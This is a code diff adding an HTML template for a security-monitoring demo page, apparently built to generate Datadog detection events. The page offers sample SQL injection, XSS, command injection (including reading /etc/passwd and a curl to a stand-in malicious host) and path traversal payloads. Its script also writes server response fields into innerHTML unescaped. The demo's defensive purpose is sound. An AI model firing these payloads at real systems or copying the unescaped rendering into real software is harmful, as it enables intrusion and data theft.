@@ -1,0 +1,334 @@
+{% extends "base.html" %}
+
+{% block title %}Security Testing - APM Demo{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card mb-4">
+            <div class="card-header bg-warning text-dark">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-shield-alt me-2"></i>Security Input Testing Interface
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle me-2"></i>
+                    <strong>Purpose:</strong> This interface allows you to test various security inputs for demonstration purposes. 
+                    All inputs are logged for Datadog security monitoring and threat detection analysis.
+                </div>
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle me-2"></i>
+                    <strong>Note:</strong> This is a controlled testing environment. Inputs are logged but not processed maliciously.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Security Input Testing Forms -->
+<div class="row">
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h6 class="card-title mb-0">
+                    <i class="fas fa-keyboard me-2"></i>Security Input Tester
+                </h6>
+            </div>
+            <div class="card-body">
+                <form id="securityTestForm">
+                    <div class="mb-3">
+                        <label for="inputType" class="form-label">Input Type</label>
+                        <select class="form-select" id="inputType" name="input_type" required>
+                            <option value="general">General Input</option>
+                            <option value="sql">SQL Injection Test</option>
+                            <option value="xss">XSS (Cross-Site Scripting) Test</option>
+                            <option value="command">Command Injection Test</option>
+                            <option value="path">Path Traversal Test</option>
+                            <option value="ldap">LDAP Injection Test</option>
+                            <option value="nosql">NoSQL Injection Test</option>
+                        </select>
+                        <div class="form-text">Select the type of security test you want to perform</div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="userInput" class="form-label">Test Input</label>
+                        <textarea class="form-control" id="userInput" name="user_input" rows="4" 
+                                  placeholder="Enter your test input here..." required></textarea>
+                        <div class="form-text">Enter the payload or input you want to test</div>
+                    </div>
+                    
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-warning" id="submitTest">
+                            <i class="fas fa-paper-plane me-2"></i>Submit for Security Analysis
+                        </button>
+                        <button type="button" class="btn btn-secondary" id="clearForm">
+                            <i class="fas fa-eraser me-2"></i>Clear Form
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Quick Test Examples -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h6 class="card-title mb-0">
+                    <i class="fas fa-lightbulb me-2"></i>Example Test Payloads
+                </h6>
+            </div>
+            <div class="card-body">
+                <div class="accordion" id="examplesAccordion">
+                    <div class="accordion-item">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#sqlExamples">
+                                SQL Injection Examples
+                            </button>
+                        </h2>
+                        <div id="sqlExamples" class="accordion-collapse collapse">
+                            <div class="accordion-body">
+                                <button class="btn btn-sm btn-outline-primary mb-2" onclick="setExample('sql', '\' OR 1=1--')">Basic SQL Bypass</button><br>
+                                <button class="btn btn-sm btn-outline-primary mb-2" onclick="setExample('sql', '\'; DROP TABLE users;--')">SQL Drop Table</button><br>
+                                <button class="btn btn-sm btn-outline-primary mb-2" onclick="setExample('sql', '\' UNION SELECT username, password FROM admin--')">SQL Union Attack</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="accordion-item">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#xssExamples">
+                                XSS Examples
+                            </button>
+                        </h2>
+                        <div id="xssExamples" class="accordion-collapse collapse">
+                            <div class="accordion-body">
+                                <button class="btn btn-sm btn-outline-danger mb-2" onclick="setExample('xss', '<script>alert(\"XSS\")</script>')">Basic XSS Alert</button><br>
+                                <button class="btn btn-sm btn-outline-danger mb-2" onclick="setExample('xss', '<img src=x onerror=alert(\"XSS\")>')">Image XSS</button><br>
+                                <button class="btn btn-sm btn-outline-danger mb-2" onclick="setExample('xss', 'javascript:alert(document.cookie)')">Cookie Theft</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="accordion-item">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#cmdExamples">
+                                Command Injection Examples
+                            </button>
+                        </h2>
+                        <div id="cmdExamples" class="accordion-collapse collapse">
+                            <div class="accordion-body">
+                                <button class="btn btn-sm btn-outline-warning mb-2" onclick="setExample('command', '; ls -la')">List Directory</button><br>
+                                <button class="btn btn-sm btn-outline-warning mb-2" onclick="setExample('command', '| cat /etc/passwd')">Read Passwd File</button><br>
+                                <button class="btn btn-sm btn-outline-warning mb-2" onclick="setExample('command', '&& curl malicious-site.com')">External Request</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="accordion-item">
+                        <h2 class="accordion-header">
+                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#pathExamples">
+                                Path Traversal Examples
+                            </button>
+                        </h2>
+                        <div id="pathExamples" class="accordion-collapse collapse">
+                            <div class="accordion-body">
+                                <button class="btn btn-sm btn-outline-info mb-2" onclick="setExample('path', '../../../etc/passwd')">Unix Passwd</button><br>
+                                <button class="btn btn-sm btn-outline-info mb-2" onclick="setExample('path', '..\\..\\..\\windows\\system32\\config\\sam')">Windows SAM</button><br>
+                                <button class="btn btn-sm btn-outline-info mb-2" onclick="setExample('path', '....//....//etc/shadow')">Encoded Traversal</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h6 class="card-title mb-0">
+                    <i class="fas fa-chart-line me-2"></i>Test Results & Response
+                </h6>
+            </div>
+            <div class="card-body">
+                <div id="testResults">
+                    <div class="text-center text-muted">
+                        <i class="fas fa-vial fa-2x mb-3"></i>
+                        <p>Submit a security test to see the response and logging information here.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Test Statistics -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h6 class="card-title mb-0">
+                    <i class="fas fa-chart-bar me-2"></i>Test Session Statistics
+                </h6>
+            </div>
+            <div class="card-body">
+                <div class="row text-center">
+                    <div class="col-6">
+                        <h4 class="text-primary" id="totalTests">0</h4>
+                        <small class="text-muted">Total Tests</small>
+                    </div>
+                    <div class="col-6">
+                        <h4 class="text-success" id="successfulTests">0</h4>
+                        <small class="text-muted">Logged Successfully</small>
+                    </div>
+                </div>
+                <hr>
+                <div class="row text-center">
+                    <div class="col-4">
+                        <h6 class="text-info" id="sqlTests">0</h6>
+                        <small class="text-muted">SQL</small>
+                    </div>
+                    <div class="col-4">
+                        <h6 class="text-warning" id="xssTests">0</h6>
+                        <small class="text-muted">XSS</small>
+                    </div>
+                    <div class="col-4">
+                        <h6 class="text-danger" id="cmdTests">0</h6>
+                        <small class="text-muted">Command</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let testStats = {
+    total: 0,
+    successful: 0,
+    sql: 0,
+    xss: 0,
+    command: 0,
+    path: 0,
+    general: 0
+};
+
+function updateStats() {
+    document.getElementById('totalTests').textContent = testStats.total;
+    document.getElementById('successfulTests').textContent = testStats.successful;
+    document.getElementById('sqlTests').textContent = testStats.sql;
+    document.getElementById('xssTests').textContent = testStats.xss;
+    document.getElementById('cmdTests').textContent = testStats.command;
+}
+
+function setExample(type, payload) {
+    document.getElementById('inputType').value = type;
+    document.getElementById('userInput').value = payload;
+    
+    // Highlight the form
+    const form = document.getElementById('securityTestForm');
+    form.classList.add('border', 'border-warning');
+    setTimeout(() => {
+        form.classList.remove('border', 'border-warning');
+    }, 2000);
+}
+
+// Form submission
+document.getElementById('securityTestForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    const submitButton = document.getElementById('submitTest');
+    const originalText = submitButton.innerHTML;
+    
+    // Update button state
+    submitButton.disabled = true;
+    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Submitting...';
+    
+    try {
+        const response = await fetch('/api/security-input', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        
+        testStats.total++;
+        if (response.ok) {
+            testStats.successful++;
+            testStats[result.input_type] = (testStats[result.input_type] || 0) + 1;
+        }
+        
+        updateStats();
+        
+        // Display results
+        const resultsDiv = document.getElementById('testResults');
+        const statusClass = response.ok ? 'success' : 'danger';
+        const statusIcon = response.ok ? 'check-circle' : 'exclamation-circle';
+        
+        resultsDiv.innerHTML = `
+            <div class="card">
+                <div class="card-header bg-${statusClass} text-white">
+                    <h6 class="mb-0">
+                        <i class="fas fa-${statusIcon} me-2"></i>Test Result
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-12">
+                            <h6>Response Details:</h6>
+                            <ul class="list-unstyled">
+                                <li><strong>Status:</strong> ${result.status || 'error'}</li>
+                                <li><strong>Message:</strong> ${result.message || result.error || 'Unknown error'}</li>
+                                <li><strong>Input Type:</strong> ${result.input_type || 'N/A'}</li>
+                                <li><strong>Input Length:</strong> ${result.input_length || 'N/A'} characters</li>
+                                <li><strong>Request ID:</strong> ${result.request_id || 'N/A'}</li>
+                                <li><strong>Timestamp:</strong> ${result.timestamp || 'N/A'}</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="alert alert-info mt-3">
+                        <i class="fas fa-info-circle me-2"></i>
+                        <strong>Datadog Monitoring:</strong> This input has been logged and is available for security analysis in your APM dashboard.
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        // Show success toast
+        showToast(`Security test logged successfully (ID: ${result.request_id})`, 'success');
+        
+    } catch (error) {
+        testStats.total++;
+        updateStats();
+        
+        document.getElementById('testResults').innerHTML = `
+            <div class="alert alert-danger">
+                <h6><i class="fas fa-exclamation-triangle me-2"></i>Test Failed</h6>
+                <p>Error submitting security test: ${error.message}</p>
+            </div>
+        `;
+        
+        showToast(`Failed to submit security test: ${error.message}`, 'danger');
+    } finally {
+        // Reset button
+        submitButton.disabled = false;
+        submitButton.innerHTML = originalText;
+    }
+});
+
+// Clear form
+document.getElementById('clearForm').addEventListener('click', function() {
+    document.getElementById('securityTestForm').reset();
+    document.getElementById('testResults').innerHTML = `
+        <div class="text-center text-muted">
+            <i class="fas fa-vial fa-2x mb-3"></i>
+            <p>Submit a security test to see the response and logging information here.</p>
+        </div>
+    `;
+});
+
+// Initialize stats display
+document.addEventListener('DOMContentLoaded', function() {
+    updateStats();
+});
+</script>
+{% endblock %}
